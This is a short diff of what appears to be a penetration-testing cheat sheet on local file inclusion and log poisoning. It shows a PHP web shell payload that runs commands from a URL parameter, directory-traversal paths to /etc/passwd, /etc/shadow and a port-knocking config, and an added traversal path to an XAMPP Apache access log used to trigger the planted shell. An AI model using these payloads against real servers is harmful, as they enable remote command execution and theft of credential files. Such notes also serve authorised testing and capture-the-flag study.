@@ -27,6 +27,7 @@ omgthissofun/<?php passthru($_GET['cmd']); ?>          # this will refeclt in /v
 /etc/passwd
  /etc/shadow
  /etc/knockd.conf     // port knocking config
+../../../../../../../xampp/apache/logs/access.log
 ```
 ```
  http://url/index.php?page=../../../etc/passwd
